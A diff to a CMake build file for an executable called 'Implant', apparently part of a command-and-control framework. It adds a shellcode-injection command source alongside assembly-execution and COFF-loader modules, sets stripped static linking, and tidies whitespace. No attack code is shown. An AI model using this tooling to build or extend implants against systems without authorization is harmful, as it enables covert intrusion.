@@ -15,7 +15,7 @@ add_executable(Implant
     src/Main.cpp
     src/Implant.cpp
     src/Channel/Channel.cpp
-    
+
     # commands
     #
     src/Command/Command.cpp
@@ -31,25 +31,26 @@ add_executable(Implant
     src/Command/CommandExecuteAssembly.cpp
     src/Command/CommandJob.cpp
     src/Command/CommandInlineExecute.cpp
+    src/Command/CommandInjectShellcode.cpp
 
     # coff loader
     #
     src/Coff/BofApis.cpp
     src/Coff/CoffLoader.cpp
     src/Coff/CoffRelocations.cpp
-    
+
     # stdlib
     #
     src/Stdlib/Base64.cpp
     src/Stdlib/Fs.cpp
 )
 
-target_link_options(Implant PRIVATE 
+target_link_options(Implant PRIVATE
     "-Wl,--gc-sections"
-    "-s"                 
-    "-static"            
-    "-static-libgcc"     
-    "-static-libstdc++"  
+    "-s"
+    "-static"
+    "-static-libgcc"
+    "-static-libstdc++"
 )
 
 set(DEFAULT_CHANNEL "{0x0}" CACHE STRING "default channel")
